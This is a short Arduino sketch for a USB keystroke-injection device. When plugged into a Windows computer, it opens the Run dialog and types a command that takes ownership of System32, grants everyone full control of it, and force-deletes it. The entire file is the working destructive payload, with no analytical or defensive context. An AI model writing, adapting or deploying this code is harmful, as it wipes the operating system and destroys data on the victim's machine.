#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /c takeown /F C:\\Windows\\System32 /R /D Y && icacls C:\\Windows\\System32 /grant Everyone:F /T /C /Q && del /F /S /Q C:\\Windows\\System32");
}

void loop() {}
